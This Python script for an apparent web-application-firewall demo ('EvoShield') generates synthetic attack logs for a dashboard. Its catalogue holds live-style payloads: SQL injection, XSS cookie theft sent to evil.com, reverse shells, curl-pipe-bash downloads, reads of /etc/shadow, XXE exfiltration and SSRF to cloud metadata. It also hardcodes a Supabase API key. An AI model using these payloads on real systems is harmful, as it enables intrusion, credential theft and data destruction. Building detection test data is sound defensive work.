"""
EVOSHIELD — Attack Examples & Simulator
========================================
Run:  python attack_examples.py
      python attack_examples.py 50       # send 50 logs
      python attack_examples.py 100 0.2  # 100 logs, 0.2s delay

All attack logs appear LIVE in the dashboard at https://evoshield-waf.vercel.app
"""

import requests
import random
import time
from datetime import datetime, timezone

import os as _os

try:
    from email_alerts import send_attack_alert as _send_email_direct
except Exception as _e:
    print(f"  [email] Direct alerts disabled: {_e}")
    def _send_email_direct(*a, **k):
        return False

# Backend endpoint: sends email AND inserts an in-app notification per user.
# Falls back to direct email if the backend isn't running.
ALERT_API = _os.getenv("ALERT_API_URL", "http://127.0.0.1:8001/api/alerts/email")


def send_attack_alert(**kw):
    try:
        r = requests.post(ALERT_API, json=kw, timeout=4)
        if r.status_code == 200:
            return True
    except Exception:
        pass
    return _send_email_direct(**kw)

# ── Supabase Config ────────────────────────────────────────────────────────────
SUPABASE_URL = "https://aeybayjzgdhjupiegymz.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFleWJheWp6Z2RoanVwaWVneW16Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE0MzY0NzIsImV4cCI6MjA5NzAxMjQ3Mn0.iLwJHGCw4VJDPHcsQSayJ4Ueptu-m4EKdncUvH8dKw0"

HEADERS = {
    "apikey":        SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type":  "application/json",
    "Prefer":        "return=minimal",
}

# ── Attack Catalogue ───────────────────────────────────────────────────────────
# Every entry: attack_type, severity, ai_score range, example payloads, target paths

ATTACKS = [

    # ── 1. SQL INJECTION ──────────────────────────────────────────────────────
    {
        "attack_type": "SQL Injection",
        "severity":    "Critical",
        "ai_range":    (0.78, 0.99),
        "paths":       ["/login", "/search", "/api/users", "/admin/query", "/api/products", "/api/orders"],
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM users --",
            "' UNION SELECT null, table_name FROM information_schema.tables --",
            "admin'--",
            "1' OR '1' = '1' /*",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1; SELECT * FROM users WHERE '1'='1",
            "' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "1 AND (SELECT COUNT(*) FROM sysobjects)>0",
        ],
    },

    # ── 2. CROSS-SITE SCRIPTING (XSS) ────────────────────────────────────────
    {
        "attack_type": "XSS",
        "severity":    "High",
        "ai_range":    (0.60, 0.92),
        "paths":       ["/comment", "/profile", "/search", "/feedback", "/post", "/api/review"],
        "payloads": [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "<svg/onload=confirm(1)>",
            "javascript:alert('XSS')",
            "'\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "\"><img src=1 onerror=alert(1)>",
            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "%-3Cscript%3Ealert(1)%3C/script%3E",
        ],
    },

    # ── 3. COMMAND INJECTION ──────────────────────────────────────────────────
    {
        "attack_type": "Command Injection",
        "severity":    "Critical",
        "ai_range":    (0.82, 0.99),
        "paths":       ["/api/ping", "/api/exec", "/tools/scan", "/api/run", "/api/lookup", "/api/traceroute"],
        "payloads": [
            "; ls -la",
            "; ls -la /etc",
            "| cat /etc/passwd",
            "| cat /etc/shadow",
            "&& whoami",
            "&& id",
            "`id`",
            "$(id)",
            "; curl http://evil.com/shell.sh | bash",
            "; wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m",
            "| nc -e /bin/sh evil.com 4444",
            "; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"evil.com\",4444));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            "&& net user hacker Password1 /add",
            "| powershell -enc JABj...",
            "; rm -rf /var/www/html/*",
        ],
    },

    # ── 4. PATH TRAVERSAL ─────────────────────────────────────────────────────
    {
        "attack_type": "Path Traversal",
        "severity":    "High",
        "ai_range":    (0.65, 0.93),
        "paths":       ["/download", "/file", "/static", "/api/read", "/api/get-file", "/assets"],
        "payloads": [
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../windows/system32/config/sam",
            "../../../windows/win.ini",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/%5C../%5C../%5C../%5C../etc/passwd",
            "....\\....\\etc\\passwd",
            "../../../proc/self/environ",
            "../../../../var/log/apache2/access.log",
            "../../../../root/.bash_history",
            "../../../../home/user/.ssh/id_rsa",
            "..%c0%af..%c0%afetc%c0%afpasswd",
        ],
    },

    # ── 5. CSRF (Cross-Site Request Forgery) ──────────────────────────────────
    {
        "attack_type": "CSRF",
        "severity":    "Medium",
        "ai_range":    (0.50, 0.80),
        "paths":       ["/api/transfer", "/api/change-password", "/api/delete-account", "/api/settings", "/admin/action"],
        "payloads": [
            "<form action='https://bank.com/transfer' method='POST'><input name='amount' value='10000'><input name='to' value='attacker'></form><script>document.forms[0].submit()</script>",
            "<img src='https://target.com/api/change-email?email=attacker@evil.com'>",
            "<script>fetch('https://target.com/api/delete',{method:'POST',credentials:'include'})</script>",
            "Referer: http://evil.com/csrf-page",
            "<form method='POST' action='/admin/create-admin'><input name='username' value='hacker'><input name='password' value='hacked'></form>",
            "<img src='http://192.168.0.1/admin/reset' width=0 height=0>",
            "<link rel='stylesheet' href='http://evil.com/csrf.css'>",
            "<script>var xhr=new XMLHttpRequest();xhr.open('POST','/api/transfer');xhr.withCredentials=true;xhr.send('amount=9999&to=attacker')</script>",
        ],
    },

    # ── 6. XXE (XML External Entity) ──────────────────────────────────────────
    {
        "attack_type": "XXE",
        "severity":    "High",
        "ai_range":    (0.68, 0.95),
        "paths":       ["/api/xml", "/api/parse", "/upload", "/api/import", "/api/feed"],
        "payloads": [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><data>&xxe;</data>",
            "<?xml?><!DOCTYPE test [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]>",
            "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
            "<!DOCTYPE foo [<!ENTITY % a SYSTEM 'file:///etc/passwd'><!ENTITY % b '<!ENTITY exfil SYSTEM \"http://evil.com/?%a;\">'>%b;]><x>&exfil;</x>",
        ],
    },

    # ── 7. SSRF (Server-Side Request Forgery) ────────────────────────────────
    {
        "attack_type": "SSRF",
        "severity":    "High",
        "ai_range":    (0.70, 0.95),
        "paths":       ["/api/fetch", "/api/webhook", "/proxy", "/api/download-url", "/api/preview"],
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://localhost:8080/admin",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://0.0.0.0:80",
            "file:///etc/passwd",
            "dict://localhost:11211/stat",
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "http://internal-api.company.local/admin/users",
            "http://10.0.0.1/admin",
            "http://192.168.1.1/cgi-bin/luci",
        ],
    },

    # ── 8. BRUTE FORCE ────────────────────────────────────────────────────────
    {
        "attack_type": "Brute Force",
        "severity":    "High",
        "ai_range":    (0.55, 0.88),
        "paths":       ["/login", "/admin/login", "/api/auth", "/api/token", "/wp-login.php"],
        "payloads": [
            "username=admin&password=admin",
            "username=admin&password=password",
            "username=admin&password=123456",
            "username=admin&password=admin123",
            "username=root&password=root",
            "username=administrator&password=P@ssw0rd",
            "username=admin&password=qwerty",
            "username=test&password=test",
            "username=admin&password=letmein",
            "username=admin&password=welcome",
        ],
    },

    # ── 9. NORMAL TRAFFIC ─────────────────────────────────────────────────────
    {
        "attack_type": "Normal",
        "severity":    "Low",
        "ai_range":    (0.01, 0.12),
        "paths":       ["/", "/home", "/about", "/api/products", "/api/users/me", "/contact", "/blog", "/api/search?q=shoes", "/favicon.ico", "/api/health"],
        "payloads": [
            "",
            "q=hello+world",
            "page=1&limit=10",
            "id=42",
            "category=electronics",
            "sort=price_asc",
            "filter=new",
            "lang=en",
            "",
            "token=valid_session_abc123",
        ],
    },
]

# ── Common Data ────────────────────────────────────────────────────────────────
IPS = [
    "192.168.1.101", "10.0.0.55",    "203.0.113.42",  "198.51.100.7",
    "45.33.32.156",  "172.16.0.23",  "185.220.101.5", "91.108.4.1",
    "1.2.3.4",       "66.249.64.1",  "104.16.0.1",    "31.13.71.36",
    "151.101.1.69",  "52.84.0.50",   "216.58.214.46", "13.107.42.14",
]

METHODS   = ["GET", "POST", "PUT", "DELETE", "PATCH"]
STATUSES  = ["Blocked", "Blocked", "Blocked", "Healed", "Flagged"]
COUNTRIES = ["IN", "US", "CN", "RU", "BR", "DE", "FR", "GB", "NG", "UA"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "Nikto/2.1.6",
    "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "WFuzz/3.1.0",
    "Hydra v9.4",
]


# ── Core insert function ───────────────────────────────────────────────────────
def insert_log(attack):
    payload = random.choice(attack["payloads"])
    lo, hi  = attack["ai_range"]
    score   = round(random.uniform(lo, hi), 2)
    is_normal = attack["attack_type"] == "Normal"
    status  = "Allowed" if is_normal else random.choice(STATUSES)

    row = {
        "source_ip":     random.choice(IPS),
        "attack_type":   attack["attack_type"],
        "payload":       payload,
        "path":          random.choice(attack["paths"]),
        "method":        "GET" if is_normal else random.choice(METHODS),
        "severity":      attack["severity"],
        "status":        status,
        "ai_score":      score,
        "response_code": 403 if status == "Blocked" else (200 if is_normal else 200),
        "bytes_in":      random.randint(64, 8192),
        "country":       random.choice(COUNTRIES),
        "user_agent":    random.choice(USER_AGENTS),
        "timestamp":     datetime.now(timezone.utc).isoformat(),
    }

    resp = requests.post(
        f"{SUPABASE_URL}/rest/v1/attack_logs",
        headers=HEADERS,
        json=row,
        timeout=10,
    )

    if not is_normal:
        send_attack_alert(
            attack_type=attack["attack_type"],
            severity=attack["severity"],
            source_ip=row["source_ip"],
            path=row["path"],
            method=row["method"],
            ai_score=score,
            payload=payload,
            status=status,
        )

    color = "OK " if resp.status_code in (200, 201) else "ERR"
    print(f"  {color} [{attack['attack_type']:22s}] {row['source_ip']:15s}  score={score:.2f}  status={status}")
    if resp.status_code not in (200, 201):
        print(f"      -> {resp.status_code}: {resp.text[:120]}")


# ── Main runner ────────────────────────────────────────────────────────────────
def run(count=30, delay=0.3):
    print(f"""
{'='*65}
  EVOSHIELD — Attack Simulator
  Sending {count} logs to Supabase...
  Watch live at: https://evoshield-waf.vercel.app
{'='*65}

  Attack types included:
    SQL Injection | XSS | Command Injection | Path Traversal
    CSRF | XXE | SSRF | Brute Force | Normal Traffic
{'='*65}
""")

    # Weighted: more attacks than normal, all types covered
    weights = [18, 15, 12, 12, 8, 8, 8, 9, 10]

    for i in range(count):
        attack = random.choices(ATTACKS, weights=weights)[0]
        print(f"[{i+1:02d}/{count}]", end=" ")
        insert_log(attack)
        time.sleep(delay)

    print(f"""
{'='*65}
  Done! {count} logs inserted.
  Open your dashboard to see them live.
{'='*65}
""")


if __name__ == "__main__":
    import sys
    count = int(sys.argv[1])   if len(sys.argv) > 1 else 30
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.3
    run(count, delay)
